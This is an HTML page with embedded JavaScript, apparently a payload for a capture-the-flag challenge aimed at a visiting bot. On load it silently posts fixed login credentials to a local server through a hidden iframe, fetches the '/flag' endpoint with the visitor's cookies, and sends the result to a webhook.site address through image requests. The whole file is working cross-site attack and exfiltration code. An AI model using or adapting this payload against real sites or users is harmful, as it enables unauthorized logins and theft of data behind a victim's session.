<!DOCTYPE html>
<html>
<body>
<script>
// 1. 먼저 페이지 로드 확인
new Image().src = 'https://webhook.site/showontest?step=1_loaded';

setTimeout(function(){
  // 2. form submit 시도
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'http://127.0.0.1:3000/login';
  form.target = 'f1';
  
  var u = document.createElement('input');
  u.name = 'username';
  u.value = 'bottest';
  form.appendChild(u);
  
  var p = document.createElement('input');
  p.name = 'password';
  p.value = 'bottest123';
  form.appendChild(p);
  
  document.body.appendChild(form);
  
  var iframe = document.createElement('iframe');
  iframe.name = 'f1';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  
  form.submit();
  
  new Image().src = 'https://webhook.site/showontest?step=2_form_submitted';
}, 100);

setTimeout(function(){
  // 3. fetch 시도
  fetch('http://127.0.0.1:3000/flag', {credentials: 'include'})
    .then(function(r){ return r.text(); })
    .then(function(f){ 
      new Image().src = 'https://webhook.site/showontest?step=3_flag&data=' + encodeURIComponent(f);
    })
    .catch(function(e){ 
      new Image().src = 'https://webhook.site/showontest?step=3_error&err=' + encodeURIComponent(e.message);
    });
}, 800);
</script>
</body>
</html>